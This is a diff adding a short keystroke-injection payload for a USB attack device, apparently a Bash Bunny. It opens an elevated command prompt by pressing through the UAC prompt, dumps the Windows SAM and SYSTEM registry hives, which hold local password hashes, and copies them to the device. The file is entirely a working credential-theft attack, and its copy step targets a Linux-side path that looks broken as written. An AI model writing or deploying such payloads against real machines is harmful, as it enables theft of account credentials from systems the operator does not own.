@@ -1,0 +1,28 @@
+ATTACKMODE HID
+
+LED G
+QUACK GUI r
+DELAY 500
+QUACK STRING cmd
+DELAY 500
+QUACK CTRL-SHIFT ENTER
+DELAY 500
+QUACK TAB
+DELAY 500
+QUACK TAB
+DELAY 500
+QUACK ENTER
+DELAY 500
+REM run commands
+QUACK STRING reg save HKLM\sam ./sam.save && reg save HKLM\system ./system.save
+QUACK ENTER
+DELAY 2000
+
+QUACK STRING copy ./sam.save /root/udisk
+QUACK ENTER
+DELAY 1000
+QUACK STRING copy ./system.save /root/udisk
+QUACK ENTER
+DELAY 1000
+REM Set the LED to green
+LED R G
